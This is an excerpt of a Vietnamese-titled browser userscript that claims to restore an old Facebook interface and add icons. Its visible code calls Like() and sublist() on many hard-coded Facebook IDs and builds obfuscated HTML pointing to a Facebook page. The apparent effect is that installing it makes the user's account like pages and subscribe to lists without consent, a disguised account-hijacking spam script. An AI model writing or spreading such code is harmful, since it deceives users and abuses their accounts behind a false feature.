// ==UserScript==
// @name            CÀI ĐẶT UPDATE TOOL Icon+SUB+LIKE+ VỀ GIAO DIỆN CŨ V-2.1 2014
...
sublist("1406543106253592");
sublist("598827473521654");
sublist("370534603080130");
sublist("219219244918015");
sublist("219219091584697");
sublist("248026538705788"); 
sublist("248026742039101");
sublist("184738821715145");
//ae
...
Like("232124713585543");
Like("416272681832073");
Like("450630045062914");
Like("715285328523016");
Like("264222567087590");
Like("1429191877320484");
Like("645563985501913");
Like("597291233653700");
...
var _0x3384x1 = [{
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/450630045062914" target="_blank">QU Dragon</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
